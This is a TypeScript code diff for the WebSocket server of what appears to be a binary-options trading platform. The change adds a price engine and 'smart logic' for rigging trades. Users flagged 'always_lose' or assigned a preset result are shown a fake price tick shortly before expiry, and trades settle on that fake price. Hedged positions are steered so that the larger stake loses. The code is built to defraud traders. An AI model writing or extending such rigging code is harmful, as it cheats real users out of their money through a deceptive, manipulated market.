@@ -3,7 +3,7 @@
 // Events (server → client):
 //   BALANCE_UPDATE, BINARY_RESULT, BINARY_PLACED, WITHDRAWAL_REJECTED,
 //   NEW_SUPPORT_MESSAGE, FORCE_LOGOUT, FORCE_RELOAD, SHOW_MODAL,
-//   UPDATE_KYC, TICK_OVERRIDE
+//   UPDATE_KYC, TICK_OVERRIDE, MARKET_TICK
 //
 // Events (client → server):
 //   AUTH, PLACE_BINARY, LOG_EVENT
@@ -12,6 +12,7 @@ import { Server as SocketIOServer, Socket } from "socket.io";
 import type { Server as HTTPServer } from "http";
 import { createHmac } from "crypto";
 import { prisma } from "../lib/prisma";
+import { startPriceEngine, getPrice, setOverridePrice } from "./priceEngine";
 
 let io: SocketIOServer | null = null;
 
@@ -49,6 +50,9 @@ export function initSocketIO(httpServer: HTTPServer): SocketIOServer {
     path: "/ws",
     transports: ["websocket", "polling"],
   });
+
+  // ─── Start server-side price engine ──────────────────────────────────────
+  startPriceEngine((event, data) => emitToAll(event, data));
 
   io.on("connection", (socket: Socket) => {
     console.log(`[WS] connected: ${socket.id}`);
@@ -136,7 +140,7 @@ export function initSocketIO(httpServer: HTTPServer): SocketIOServer {
       const tradeId   = result.tradeId;
       const expiryMs  = data.expiryMs;
 
-      // ─── IMPULSE CANDLE: за 2 сек до экспирации шлём TICK_OVERRIDE ────────
+      // ─── Smart Logic: Hedge detection + TICK_OVERRIDE ────────────────────────
       const user = await prisma.user.findUnique({ where: { id: userId } });
       const scenario = user?.always_lose ? "LOSS"
         : user?.next_trade_result !== "AUTO" ? user?.next_trade_result
@@ -147,26 +151,71 @@ export function initSocketIO(httpServer: HTTPServer): SocketIOServer {
       if (scenario !== "AUTO" && expiryMs > 3000) {
         // За 2 секунды до конца — подменяем тик
         const tickDelay = Math.max(expiryMs - 2000, expiryMs * 0.85);
-        setTimeout(() => {
+        setTimeout(async () => {
           const entryPrice = data.entryPrice;
-          // Рассчитываем «импульсную» цену
-          const offset = entryPrice * (0.0005 + Math.random() * 0.0005); // 0.05-0.1%
-          let impulsePrice: number;
-          if (scenario === "LOSS") {
-            impulsePrice = data.direction === "CALL"
-              ? entryPrice - offset   // CALL → цена ниже = лосс
-              : entryPrice + offset;  // PUT  → цена выше = лосс
+
+          // ── Hedge detection: проверяем все ACTIVE трейды на этой паре ──────
+          const activeTrades = await prisma.binaryTrade.findMany({
+            where: { user_id: userId, symbol: data.symbol, status: "ACTIVE" },
+          });
+
+          let moveUp: boolean; // true = цена идёт вверх, false = вниз
+
+          const callStake = activeTrades
+            .filter(t => t.direction === "CALL")
+            .reduce((s, t) => s + Number(t.amount), 0);
+          const putStake = activeTrades
+            .filter(t => t.direction === "PUT")
+            .reduce((s, t) => s + Number(t.amount), 0);
+
+          const hasHedge = callStake > 0 && putStake > 0;
+          const PAYOUT = 0.8;
+
+          if (hasHedge) {
+            // ── Smart Logic: определяем направление на основе суммарных ставок
+            // Для LOSS: двигаем цену так, чтобы позиция с бОльшей ставкой проиграла
+            // Для WIN: двигаем так, чтобы бОльшая позиция выиграла (если возможно)
+            if (scenario === "LOSS") {
+              moveUp = callStake <= putStake; // UP → PUT теряет (бОльшая) 
+            } else {
+              // WIN: проверяем возможность
+              const largerStake = Math.max(callStake, putStake);
+              const smallerStake = Math.min(callStake, putStake);
+              // WIN возможен только если largerStake * PAYOUT > smallerStake
+              if (largerStake * PAYOUT > smallerStake) {
+                moveUp = callStake >= putStake; // UP → CALL (бОльшая) побеждает
+              } else {
+                // Hedge слишком плотный — WIN невозможен, выбираем "наименьший убыток"
+                // UP: CALL win (+callStake*0.8), PUT lose (-putStake) → net
+                const netUp   = callStake * PAYOUT - putStake;
+                const netDown = putStake * PAYOUT - callStake;
+                moveUp = netUp > netDown;
+              }
+            }
+            console.log(`[SmartLogic] Hedge detected: CALL=$${callStake}, PUT=$${putStake}, scenario=${scenario}, moveUp=${moveUp}`);
           } else {
-            impulsePrice = data.direction === "CALL"
-              ? entryPrice + offset   // CALL → цена выше = вин
-              : entryPrice - offset;  // PUT  → цена ниже = вин
+            // ── Нет хеджа — стандартная логика для одиночной сделки
+            if (scenario === "LOSS") {
+              moveUp = data.direction !== "CALL"; // CALL → вниз, PUT → вверх
+            } else {
+              moveUp = data.direction === "CALL"; // CALL → вверх, PUT → вниз
+            }
           }
+
+          // Рассчитываем импульсную цену
+          const offset = entryPrice * (0.0005 + Math.random() * 0.0005); // 0.05-0.1%
+          const impulsePrice = moveUp
+            ? entryPrice + offset
+            : entryPrice - offset;
+
+          // Обновляем серверный price engine, чтобы settlement использовал эту цену
+          setOverridePrice(data.symbol, impulsePrice);
 
           emitToUser(userId, "TICK_OVERRIDE", {
             tradeId,
             symbol: data.symbol,
             price: impulsePrice,
-            direction: scenario === "LOSS" ? (data.direction === "CALL" ? "down" : "up") : (data.direction === "CALL" ? "up" : "down"),
+            direction: moveUp ? "up" : "down",
           });
         }, tickDelay);
       }
@@ -175,8 +224,8 @@ export function initSocketIO(httpServer: HTTPServer): SocketIOServer {
       const timer = setTimeout(async () => {
         tradeTimers.delete(tradeId);
         try {
-          const drift = (Math.random() - 0.5) * 0.01;
-          const marketPrice = data.entryPrice * (1 + drift);
+          // Используем серверную цену вместо случайного drift
+          const marketPrice = getPrice(data.symbol) || data.entryPrice * (1 + (Math.random() - 0.5) * 0.01);
           const settleResult = await settleBinaryTrade(tradeId, marketPrice);
 
           emitToUser(userId, "BINARY_RESULT", settleResult);
